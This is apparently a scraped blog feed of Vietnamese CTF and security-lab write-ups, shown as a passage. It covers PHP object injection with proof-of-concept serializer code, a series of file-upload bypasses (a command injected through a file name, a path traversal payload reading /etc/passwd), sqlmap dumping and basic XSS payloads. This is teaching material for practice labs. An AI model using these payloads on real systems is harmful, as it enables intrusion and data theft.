AgIDxpIGNsYXNzPSJmYSBmYS1waW50ZXJlc3QiPjwvaT4NCiAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICBL4buzIENvDQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8aDE+MHg5ODwvaDE+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ1dHRvbiBncmVlbiIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdob2NvYyc+DQogICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtdmluZSI+PC9pPg0KICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBOaGEgVHJhbmcNCiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICA8bGk+DQogICAgICAgICAgICAgICAgICAgIDxoMT4weDMzPC9oMT4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIHJlZCIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdwaHVxdW9jJz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1nb29nbGUtcGx1cyI+PC9pPg0KICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgIFBow7ogUXXhu5FjDQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICA8L3VsPg0KICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KPC9kaXY+DQo8L2Zvcm0+DQo8L2JvZHk+DQoNCjwvaHRtbD4NCjw/cGhwDQoJZXJyb3JfcmVwb3J0aW5nKDApOw0KCWluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQoJJGNob249Jyc7DQoJaWYoaXNzZXQoJF9HRVRbJ2dpZiddKSl7DQoNCgkJJGNob24gPSAkX0dFVFsnZ2lmJ107DQoJfQ0KCWlmKCRjaG9uID09ICJwbGF5MTFmaXgiKXsNCgkJZWNobyBmaWxlX2dldF9jb250ZW50cygieG54eC50eHQiKTsNCgl9DQoJZWxzZQ0KCXsNCgkJaW5jbHVkZSgkY2hvbi4iLnBocCIpOw0KCX0JDQo/Pg0KSử dụng Cyberchef để decode, chúng ta được source của trang webFull source cho bạn nào muốn dựng lab lại ☆: .｡. o(≧▽≦)o .｡.:☆&lt;html&gt;&lt;title&gt;Select Trip&lt;/title&gt;&lt;body&gt;&lt;link rel=\"stylesheet\" href=\"ducbt.css\"&gt;&lt;h1 style=\"font-family: cursive;\"&gt;Select m3..&lt;/h1&gt;&lt;form action=\"index.php\" method='get' name=\"\" &gt;\t&lt;div class=\"container\"&gt; &lt;div class=\"row share-buttons\"&gt; &lt;div class=\"col-md-8 col-md-offset-2\"&gt; &lt;div style=\"margin: auto;\"&gt; \t &lt;ul &gt; &lt;li &gt; &lt;h1&gt;0x78&lt;/h1&gt; &lt;button class=\"button\" type=\"submit\" name='gif' value='coto'&gt; &lt;i class=\"fa fa-github\"&gt;&lt;/i&gt; Cô Tô &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x111&lt;/h1&gt; &lt;button class=\"blue button\" type=\"submit\" name='gif' value='condao'&gt; &lt;i class=\"fa fa-twitter\"&gt;&lt;/i&gt; Côn Đảo &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x111&lt;/h1&gt; &lt;button class=\"button pink\" type=\"submit\" name='gif' value='kyco'&gt; &lt;i class=\"fa fa-pinterest\"&gt;&lt;/i&gt; Kỳ Co &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x98&lt;/h1&gt; &lt;button class=\"button green\" type=\"submit\" name='gif' value='hococ'&gt; &lt;i class=\"fa fa-vine\"&gt;&lt;/i&gt; Nha Trang &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x33&lt;/h1&gt; &lt;button class=\"button red\" type=\"submit\" name='gif' value='phuquoc'&gt; &lt;i class=\"fa fa-google-plus\"&gt;&lt;/i&gt; Phú Quốc &lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php\terror_reporting(0);\tini_set('display_errors', 0);\t$chon='';\tif(isset($_GET['gif'])){\t\t$chon = $_GET['gif'];\t}\tif($chon == \"play11fix\"){\t\techo file_get_contents(\"xnxx.txt\");\t}\telse\t{\t\tinclude($chon.\".php\");\t}?&gt;Source code PHP có đoạn code check, nếu giá trị đầu vào do người dùng nhập là play11fix thì sẽ lấy ra nội dung file ích nờ xx chấm txt .Sau khi nhập vào chúng ta sẽ được flag 🦝WhiteHat{B3@ut1ful_B3@ch_D3st1n@t10ns_1n_V13tn@m}Web06Web06 mình không note hay screenshot nhiều tại vì mình làm với tâm trạng cay cú =))) (vì thế đã đấm nó bằng sqlmap, xin lỗi nếu làm ảnh hưởng đến trải nghiệm duyệt web và chơi ctf của các bạn :^ )Ok, test với sqlmap mình lấy được tên database public, bảng pokemon và biết được có tổng cộng 899 bản ghi trong bảng pokemon .Nhưng trên web chỉ hiển thị 898 pokemon, thể nên mình sử dụng sqlmap để dump ra con pokemon có id=899Và đây là con hàng thứ 899, flag của bài này, cũng là bài duy nhất trong web challenge mà mình chưa thó được flagBonus thêm 1 bài misc mà mình không nghĩ sẽ giải ra bằng cách này, lại 1 lần nữa, anh Bảnh thốt lênCảm ơn WhiteHat đã tổ chức giải CTF lần này, cũng vừa đúng dịp để mình kiểm tra xem bản thân đã học và làm được những gì ╰(°▽°)╯. Shout out to những người anh em xương máu ╰(°▽°)╯" }, { "title": "PHP Object Injection BlueCyber", "url": "/posts/PHPObjInjection/", "categories": "Writeup", "tags": "writeup, php_object_injection", "date": "2022-05-19 12:00:00 +0800", "snippet": "PHP Object Injection BlueCyberLab1Source code&lt;?phpinclude 'flag.php';class pkshow{ function echo_name() { return \"Pk very safe^.^\"; }}class acp{ protected $cinder; public $neutron; public $nova; function __construct() { $this-&gt;cinder = new pkshow; } function __toString() { if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); }}class ace{ public $filename; public $openstack; public $docker; function echo_name() { $this-&gt;openstack = unserialize($this-&gt;docker); if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) { $file = \"./{$this-&gt;filename}\"; if (file_get_contents($file)) { return file_get_contents($file); } else { return \"keystone lost~\"; } } }}if (isset($_GET['pks'])){ $logData = unserialize($_GET['pks']); echo $logData;}else{ highlight_file(__file__);}?&gt;Trang web nhận tham số đầu vào pks theo phương thức GET và tiến hành unserialize. Ý tưởng ở đây là tùy chỉnh giá trị tham số pks để đọc được nội dung file flag.php chứa flag.Ở magic method __construct(), biến cinder đã được khởi tạo là 1 đối tượng thuộc lớp pkshow có phương thức echo_name() để in ra 1 chuỗiTa quan tâm đến magic method __toString() sẽ gọi phương thức echo_name() của biến cinder nếu biến cinder đã được khởi tạoTiếp tục quan sát source code, ta thấy class ace có phương thức có cùng tên ( echo_name() ) sẽ in ra nội dung của 1 file nếu điều kiện if thỏa mãnHướng giải quyết: Gán thuộc tính cinder của class acp bằng 1 đối tượng thuộc class ace, magic method __toString() của class acp sẽ trigger hàm echo_name() để in ra nội dung file tùy ý do người dùng cung cấpViệc cần giải quyết cuối cùng là làm cho câu lệnh điều kiện if đúng để có thể in ra nội dung fileĐể câu lệnh if luôn đúng, ta sẽ tạo ra một class tmp chứa 2 thuộc tính neutron và nova, sau đó gán cho biến docker một đối tượng thuộc lớp tmp, khi đó câu lệnh if sẽ so sánh 2 giá trị null và luôn trả về trueViệc cuối cùng cần làm là gán đường link đến file cần đọcPOC&lt;?phpclass acp{ protected $cinder; public $neutron; public $nova; function __construct() { $this-&gt;cinder = new ace(); }}class tmp { public $neutron; public $nova;}class ace{ public $filename = 'flag.php'; public $openstack; public $docker; public function __construct() { $this-&gt;docker = serialize(new tmp()); }}$a = new acp();// echo \"\\n\";// echo serialize($a);echo \"\\n\";echo(urlencode(serialize($a)));?&gt;FlagLab3Trong file index.php có đoạn code php khởi tạo đối tượng player với tên do người dùng nhập vào, sau đó set cookie hero với giá trị là mã hóa base64 chuỗi serialize của đối tượng player vừa tạoFile player.php có đoạn code khai báo class vipPlayerỞ đây ta chú ý đến function GetIcon() sẽ trả về chuỗi mã hóa base64 icon của vũ khíCheck file weaporn.phpMagic method __construct() sẽ gán đường dẫn cho thuộc tính fileIconTrong file start.php có đoạn code sẽ render ra icon của vũ khí nếu nhân vật có hàng nóngVector khai thác: lợi dụng magic method __construct() của class weapon và class vipPlayer (vì player không có hàng nóng)POC&lt;?phpdefine('BASE', \"./\");class weapon{\tprivate $fileIcon;\tfunction __construct()\t{\t\t$this-&gt;fileIcon = BASE . \"Fl4g.php\";\t}\tpublic function GetIcon()\t{\t\treturn file_get_contents($this-&gt;fileIcon);\t}\tpublic function GetMaxDamage()\t{\t\treturn 50;\t}}class player{\tprotected $name;\tprotected $maxDamage;\tprotected $health;\tfunction __construct($name)\t{\t\t$this-&gt;name = $name;\t\t$this-&gt;health = 100;\t\t$this-&gt;maxDamage = 10;\t}\tpublic function GetName()\t{\t\treturn $this-&gt;name;\t}\tpublic function GetHealth()\t{\t\treturn $this-&gt;health;\t}\tpublic function SetHealth($health)\t{\t\t$this-&gt;health = $health;\t}\tpublic function attack()\t{\t\treturn rand(0, $this-&gt;maxDamage);\t}\tpublic function HaveWeapon()\t{\t\treturn false;\t}}class vipPlayer extends player{\tprivate $weapon;\tfunction __construct($name)\t{\t\t$this-&gt;name = $name;\t\t$this-&gt;health = 200;\t\t$this-&gt;weapon = new weapon();\t\t$this-&gt;maxDamage = $this-&gt;weapon-&gt;GetMaxDamage();\t}\tpublic function GetIcon()\t{\t\treturn base64_encode($this-&gt;weapon-&gt;GetIcon());\t}\tpublic function HaveWeapon()\t{\t\treturn true;\t}}$a = new vipPlayer(\"a\");echo base64_encode(serialize($a));?&gt;Ta được payloadTzo5OiJ2aXBQbGF5ZXIiOjQ6e3M6MTc6IgB2aXBQbGF5ZXIAd2VhcG9uIjtPOjY6IndlYXBvbiI6MTp7czoxNjoiAHdlYXBvbgBmaWxlSWNvbiI7czoxMDoiLi9GbDRnLnBocCI7fXM6NzoiACoAbmFtZSI7czoxOiJhIjtzOjEyOiIAKgBtYXhEYW1hZ2UiO2k6NTA7czo5OiIAKgBoZWFsdGgiO2k6MjAwO30=Chặn bắt request với BurpSuite và đổi giá trị cookie hero, có thể thấy player đã có hàng nóngCheck ảnh ta có đoạn mã hóa base64Decode được flagBài này anh Tiến thương các em nên để nguyên file Payload.php rồi =)) mình chỉ phân tíchLab4Ta chú ý đến class getFileSystem có magic method __wakeup() (tự động gọi khi unserialize đối tượng) sẽ in ra biến $flag trong file flag.phpClass User có magic method __destruct() sẽ check xem tin nhắn người dùng nhập vào có phải chuỗi “Blue7eam” không, nếu có sẽ giải mã base64 chuỗi username người dùng nhập vào và unserialize chuỗi đóNhư vậy, chỉ cần nhập đúng chuỗi tin nhắn “Blue7eam” và username là mã hóa base64 của chuỗi serialize đối tượng thuộc class getFileSystem. Khi đó hàm __destruct() tự động gọi khi chương trình kết thúc sẽ dẫn đến hàm __wakeup() của class getFileSystem được thực thi ⇒ in ra flag.POC&lt;?phpclass getFileSystem{ public function __wakeup(){ include('flag.php'); echo $flag; }}$a = new getFileSystem();echo serialize($a);?&gt;Flag" }, { "title": "CyberJutsu Upload File Challenge", "url": "/posts/CyberJutsuUploadFile/", "categories": "Writeup", "tags": "writeup, upload_file", "date": "2022-05-19 12:00:00 +0800", "snippet": "CyberJutsu UploadFileLevel 1Source code của level 1&lt;?php error_reporting(0); // Create folder for each user session_start(); $dir = 'upload/' . session_id(); if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $file = $dir . \"/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Đoạn code trên sẽ thực hiện tạo một đường dẫn tạm thời bằng cách nối chuỗi “upload” với session id của người dùng. Biến $_FILES là một biến mảng toàn cục của PHP, lưu toàn bộ thông tin về file upload. Sau khi check xem $_FILES[\"file\"] đã được khởi tạo chưa, chương trình sẽ lưu file trong thư mục tạm thời đã tạo ở trên và đưa ra đường link đến file vừa upload.Tạo file test.php với nội dungThực hiện upload file test.php, ta thấy trang web báo thành công và trả về đường link đến file vừa uploadClick vào đường link trên, ta thấy file php được thực thi và trả về kết quảThay đổi nội dung file, thực hiện upload và truy cập đường link, trang web trả về kết quả của câu lệnh whoamiLevel 2Source code của level 2:&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $filename = $_FILES[\"file\"][\"name\"]; $extension = explode(\".\", $filename)[1]; if ($extension === \"php\") { die(\"Hack detected\"); } $file = $dir . \"/\" . $filename; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Đoạn code trên sẽ thực hiện tách tên file bằng hàm explode. Hàm explode là một hàm xử lý chuỗi trong php, dùng để tách 1 chuỗi được phân tách với nhau bằng 1 kí tự (trong đoạn code trên là kí tự \".\" ) và trả về 1 mảng những chuỗi đã được phân tách. Ví dụ:$a = \"he.llo.wor.ld\";var_dump(explode(\".\",$a));//Return array(4) {// [0]=&gt;// string(2) \"he\"// [1]=&gt;//string(3) \"llo\"//[2]=&gt;//string(3) \"wor\"//[3]=&gt;//string(2) \"ld\"//}Sau khi tách chuỗi, chương trình sẽ check xem chuỗi ở vị trí thứ 1 trong mảng có phải .php không, nếu có sẽ dừng chương trình và in ra “Hack detected”Bypass bằng cách thêm 1 đuôi file nữa vào (ở đây mình thêm đuôi .png) , khi này, mảng $extension sẽ có giá trị [”ten_file”,”png”,”php”] và biến $extension sẽ có giá trị “png”Upload file và truy cập đường dẫnTrang web hiển thị kết quả của câu lệnh whoamiLevel 3Source code của level 3&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $filename = $_FILES[\"file\"][\"name\"]; $extension = end(explode(\".\", $filename)); if ($extension === \"php\") { die(\"Hack detected\"); } $file = $dir . \"/\" . $filename; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Đoạn code trên có phần tương tự với level 2, nhưng thay vì lấy đuôi file ở vị trí thứ 1 trong mảng như level 2 thì chương trình này sẽ lấy đuôi file cuối cùngBypass bằng cách sử dụng đuôi .[phar](https://filegi.com/file-info/phar-3781/)Upload file đuôi pharTrang web hiển thị kết quả của câu lệnh whoamiLevel 4Source code của Level 4&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $filename = $_FILES[\"file\"][\"name\"]; $extension = end(explode(\".\", $filename)); if (in_array($extension, [\"php\", \"phtml\", \"phar\"])) { die(\"Hack detected\"); } $file = $dir . \"/\" . $filename; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Level này trang web sử dụng blacklist, nếu đường dẫn của file là php, phtml, phar thì chương trình sẽ dừng và in ra dòng chữ “Hack detected”Bypass bằng cách ghi đè file .htaccessUpload file .htaccess vừa tạoĐổi đuôi file sang php2 và tiến hành upload fileTrang web hiển thị kết quả câu lệnh whoamiLevel 5Source code level 5:&lt;?php error_reporting(0); // Create folder for each user session_start(); if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = 'upload/' . session_id(); } $dir = $_SESSION['dir']; if ( !file_exists($dir) ) mkdir($dir); if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { $error = ''; $success = ''; try { $mime_type = $_FILES[\"file\"][\"type\"]; if (!in_array($mime_type, [\"image/jpeg\", \"image/png\", \"image/gif\"])) { die(\"Hack detected\"); } $file = $dir . \"/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Đoạn code thực hiện check MIME type của file được upload lên, nếu không là 1 trong 3 kiểu \"image/jpeg\", \"image/png\", \"image/gif\" thì chương trình sẽ dừng và in ra màn hình chuỗi “Hack detected”Sử dụng Burp Suite để bắt POST request upload fileChỉnh sửa Content-Type thành image/gif và gửi lại request, ta thấy trang web thông báo upload thành côngTruy cập url chứa file đã uploadLevel 6Soure code level 6:&lt;?php // Create folder for each user session_start(); $dir = 'upload/' . session_id(); if ( !file_exists($dir) ) mkdir($dir); $error = ''; $success = ''; if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__)); if(isset($_FILES[\"file\"])) { try { $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']); $whitelist = array(\"image/jpeg\", \"image/png\", \"image/gif\"); if (!in_array($mime_type, $whitelist, TRUE)) { die(\"Hack detected\"); } $file = $dir . \"/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file); $success = 'Successfully uploaded file at: &lt;a href=\"/' . $file . '\"&gt;/' . $file . ' &lt;/a&gt;'; } catch(Exception $e) { $error = $e-&gt;getMessage(); } }?&gt;Đoạn code sử dụng hàm finfo_file để lấy MIME type của file, sau đó check xem có trong whitelist đã được khai báo trước không, nếu không có trong whitelist định trước chương trình sẽ dừng và in ra chuỗi “Hack detected”Bypass bằng cách thêm header của file gif vào trước đoạn code phpBypass và upload file thành côngTruy cập url của file đã uploadLevel 7Ở level này, trang web cho phép người dùng upload 1 file nén, phía backend của trang web sẽ unzip (giải nén) và lưu vào folder cho người dùngTiến hành upload thử một fileMình chú ý đến câu lệnh để unzip file được in phía dưới, tên file sẽ được đưa vào một câu lệnh để giải nén file, và tên file là do phía người dùng cung cấp nên chúng ta có thể chỉnh sửa tên file để khai thác lỗ hổng OS Command InjectionUnzipper command: unzip /usr/upload/616609e23f10f16ea1ff8e114b4974c3/e66ea8344f034964ba0b3cb9879996ff.tar -d /usr/upload/616609e23f10f16ea1ff8e114b4974c3Thực hiện bắt post request upload file và chỉnh sửa tên file thành ten_file &amp; &lt;command&gt; &amp; .Payload &amp; &lt;command&gt; &amp; với &amp; là một toán tử câu lệnh trong linux với mục đích chạy ngầm 1 câu lệnh. Thay command = echo hell, ta thấy trang web trả về chuỗi “hell”Thay command thành whoami , trang web trả về www-dataLevel 8&lt;?php error_reporting(0); if (!isset($_GET['game'])) { header('Location: /?game=fatty-bird-1.html'); } $game = $_GET['game']; if(isset($_GET[\"debug\"])) die(highlight_file(__FILE__));?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;?php include './views/header.html'; ?&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=\"navbar navbar-expand-lg navbar-light bg-light\"&gt; &lt;a href=\"?game=fatty-bird-1.html&amp;debug\"&gt;Debug source&lt;/a&gt; &lt;/nav&gt; &lt;br&gt;&lt;br&gt; &lt;h3 class=\"display-4 text-center\"&gt;File upload workshop&lt;/h3&gt; &lt;h4 class=\"display-4 text-center\"&gt;Level 8&lt;/h4&gt; &lt;p class=\"display-5 text-center\"&gt;Goal: read /etc/passwd&lt;/p&gt; &lt;br&gt; &lt;div style=\"background-color: white; padding: 20px;\"&gt; &lt;?php include './views/' . $game; ?&gt; &lt;/div&gt; &lt;/body&gt; &lt;?php include './views/footer.html' ?&gt;&lt;/html&gt;Đoạn code trên thực hiện lấy GET parameter “game” và truyền vào phần dưới của trang web: &lt;?php include './views/' . $game; ?&gt;Đây là lỗi Path Traversal, như quan sát thấy, chúng ta đang ở thư mục views, là thư mục con của /var/www/html/ (Thư mục default của apache) vì vậy cần sử dụng 4 lần ../ để về thư mục gốc của hệ điều hành, sau đó truy cập /etc/passwdPayload: ../../../../etc/passwdLevel 9Source code của phần game:Tương tự như lv 8, lv 9 cũng dính lỗi Path TraversalTrang Profile có chức năng upload avatar người chơiUpload file hehe.php với nội dungTa thấy trang web không hề filter file phpTruy cập file avatar từ trang Hall of fame, ta thấy tên file đã được đổi thành avatar.jpg và code php không được thực thiCheck file source code của trang profile, ta thấy đường dẫn lưu file avatar do người dùng upload lên là /usr/uploadSử dụng Path Traversal để truy cập đến avatar của bản thân, ta thấy câu lệnh whoami được thực thi và in ra kết quảShout out to CyberJutsu vì challenge chất lượng ❤️" }, { "title": "DCTF22 - Seek", "url": "/posts/DCTF22Seek/", "categories": "Writeup, DCTF22", "tags": "web, writeup", "date": "2022-04-19 21:00:00 +0800", "snippet": "SeekFile seek.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int oops(){ printf(\"oops this wasn't the char I was looking for\\n\"); exit(1); return 0;}int main () { FILE *fp; char c; fp = fopen(\"flag.txt\",\"r\"); if (fp==NULL) { printf(\"error opening file\\n\"); exit(1); } fseek(fp,540,SEEK_SET);c=fgetc(fp);if(c != 32){oops();}fseek(fp,711,SEEK_SET);c=fgetc(fp);if(c != 32){oops();}fseek(fp,73,SEEK_SET);c=fgetc(fp);if(c != 95){oops();}fseek(fp,68,SEEK_SET);c=fgetc(fp);if(c != 95){oops();}fseek(fp,155,SEEK_SET);c=fgetc(fp);if(c != 95){oops();}.....fseek(fp,433,SEEK_SET);c=fgetc(fp);if(c != 46){oops();} printf(\"CORRECT!\\n\"); fclose(fp); return(0);}File seek.c full: https://drive.google.com/file/d/11T-2a3gX5nmZHI-CPcSKSjcVJA9OVe_q/view?usp=sharingFile flag.txt là file trốngReview code file seek.cHàm oops() sẽ in ra 1 chuỗi và kết thúc chương trìnhTrong hàm main khai báo biến kí tự c và con trỏ fileĐoạn code tiếp theo, mỗi dòng lệnh sẽ thực hiện 3 việc Nhảy con trỏ đến 1 vị trí nào đó trong file Lấy ra kí tự ở vị trí con trỏ file fp đang trỏ đến So sánh với 1 kí tự định trước, nếu không giống nhau sẽ thực hiện hàm oops() (thoát chương trình)Hướng giải: Ghi vào file từng kí tự mà câu lệnh if đang so sánhChỉnh sửa lại hàm oops để nó vẽ ra cờ :^Với mỗi câu lệnh gọi hàm oops(), thay thế bằng fputs(oops(),fp);" }, { "title": "Information Disclosure Labs", "url": "/posts/In4DisclosureLabs/", "categories": "Blog, PortSwigger", "tags": "information_disclosure", "date": "2022-03-31 21:00:00 +0800", "snippet": "Information Disclosure LabsLab: Information disclosure in error messagesGiao diện trang webTa thấy trang web sử dụng GET request với parameter productId=2 để truy xuất thông tin chi tiết của một sản phẩmThử thay thế giá trị hợp lệ thành một giá trị với kiểu dữ liệu khácTa thấy trang web trả lại thông báo lỗi kèm cả vesion của apache cho chắc chắn :^Lab: Information disclosure on debug pageLần này, chúng ta cần lấy được SECRET_KEYCheck qua source code của trang web, ta thấy 1 comment, hàng về hàng vềTruy cập url và tìm được SECRET_KEYLab: Source code disclosure via backup filesCheck file robots.txtTruy cập /backupTa có file backup ProductTemplate.javaPass của db được hard code trong fileLab: Authentication bypass via information disclosureĐang cập nhật. . ." }, { "title": "Information disclosure vulnerabilities", "url": "/posts/In4Disclosure/", "categories": "Blog, PortSwigger", "tags": "portswigger, information_disclosure", "date": "2022-03-31 12:00:00 +0800", "snippet": "Information disclosure vulnerabilitiesInfromation disclosure là gì Thông tin bị tiết lộ hay rò rỉ khi website vô tình tiết lộ thông tin nhạy cảm cho người dùng Tùy vào hoàn cảnh, trang web có thể để lộ nhiều loại thông tin, bao gồm Dữ liệu về các người dùng khác (username, thông tin tài chính,. . .) Dữ liệu kinh doanh hoặc thương mại Chi tiết về công nghệ, kĩ thuật được sử dụng trên trang web và cơ sở hạ tầng của nó Một vài ví dụ về Information Disclosure Tiết lộ tên của các thư mục ẩn, cấu trúc và nội dung của chúng từ file robots.txt hoặc danh sách thư mục Cung cấp quyền truy cập vào source code thông qua các bản sao lưu tạm thời (temporary backups) Đề cập đến tên bảng hoặc tên cột trong databases trong thông báo lỗi Hard code API keys, địa chỉ IP, thông tin đăng nhập databases trong source code Gợi ý về sự tồn tại hoặc không của tài nguyên, tên người dùng, v.v. thông qua sự khác biệt nhỏ trong thông báo, phản hồi của ứng dụng. Ví dụ thực tế ở dưới =)))Cách mà lỗ hổng chít tịt này phát sinh ? Quên xóa nội dung nội bộ khỏi nội dung công khai. Ví dụ: Comment của dev có thể hiển thị cho người dùng Cấu hình thiếu hoặc cấu hình sai trang web và các công nghệ liên quan. Ví dụ: Không tắt tính năng debug : D Lỗ hổng trong thiết kế và phát triển phần mềm: Ví dụ: Trả về thông báo lỗi khác nhau cho chức năng đăng nhập: “Sai tên đăng nhập” và “Sai mật khẩu” thay vì “Tên đăng nhập HOẶC mật khẩu sai”Ảnh hưởng của lỗ hổng này ? Lỗ hổng có thể tác động trực tiếp và gián tiếp đến trang web tùy thuộc vào mục đích của trang web, kẻ tấn công có thể thu thập được thông tin nào đó Trong một số trường hợp, chỉ riêng việc tiết lộ thông tin nhạy cảm cũng gây ảnh hưởng nghiêm trọng. Ví dụ: Một trang web thương mại điện tử làm lộ dữ liệu thẻ tín dụng của khách hàng, … Mặt khác, thông tin kĩ thuật bị rò rỉ như cấu trúc thư mục, thông tin về các công nghệ, framework đang được sử dụng có thể là thông tin quan trọng, một “mảnh ghép còn thiếu” để kẻ tấn công tận dụng, hoàn thiện kịch bản tấn công hoặc mở ra nhiều attack vector (hướng tấn công) khác. Trong trường hợp này, mức độ nghiêm trọng của lỗ hổng phụ thuộc vào những gì mà kẻ tấn công có thể làm với thông tin bị rò rỉ ( với mình thì chắc vô dụng =))) )Cách khai thác lỗ hổng Information DisclosurePhần này khá dài nên có lẽ mình sẽ viết trong bài tiếp theoNgăn chặn/khắc phục lỗ hổng này?Việc ngăn chặn hoàn toàn lỗ hổng này là một việc khó khăn do có nó có thể phát sinh theo nhiều cách khác nhau. Dù vậy, chúng ta hoàn toàn có thể sử dụng những cách sau đây để hạn chế được lỗ hổng Information Disclosure: Đầu tiên là con người ( Lỗ hổng lớn nhất của bất kì hệ thống nào :^ ). Đảm bảo rằng tất cả mọi người tham gia vào phát triển trang web đều nhận thức được thông tin nào là thông tin nhạy cảm. Đôi khi những thông tin tưởng chừng rất đơn giản nhưng lại cực kì hữu ích cho kẻ tấn công :^ Sử dụng những thông báo chung càng nhiều càng tốt, không cung cấp bất kì “hint” nào cho kẻ tấn công Kiểm tra kỹ để đảm bảo rằng mọi tính năng gỡ lỗi, chẩn đoán đã được tắt Đảm bảo hiểu đầy đủ cách cấu hình và ý nghĩa bảo mật của bất kỳ công nghệ bên thứ ba nào mà bạn triển khai. Dành thời gian để tìm hiểu và tắt bất kỳ tính năng và cài đặt nào mà bạn không thực sự cần." }, { "title": "XSS level mẫu giáo xD", "url": "/posts/XSSBasic/", "categories": "Writeup, tryhackme", "tags": "web, writeup", "date": "2022-03-07 23:00:00 +0800", "snippet": "XSS level mẫu giáo xDWriteup của mình về 1 bài trên tryhackme.com, gồm 6 levelLevel 1Xem qua trang webNhập tên vào ô input, tên nhập vào sẽ được hiển thị với câu chàoSource codeNhập&lt;script&gt;alert(\"THM\")&lt;/script&gt;Và qua được level 1Level 2Chuỗi nhập vào sẽ được hiển thị trong 1 ô inputXem qua source code, ta thấy giá trị nhập vào được chèn vào thuộc tính value của thẻ inputPayload để bypass với dấu “ và &gt; để đóng thẻ input\"&gt;&lt;script&gt;alert(\"THM\")&lt;/script&gt;Level 3Lần này đầu vào được cho vào 1 textareaSource codePayload tương tự như trên, lần này đóng thẻ textarea rồi chèn cặp thẻ script&lt;/textarea&gt;&lt;script&gt;alert(\"THM\")&lt;/script&gt;Level 4Lần này chuỗi nhập vào được hiện thị tương tự Level 1Check thử source codeTa thấy có 1 đoạn 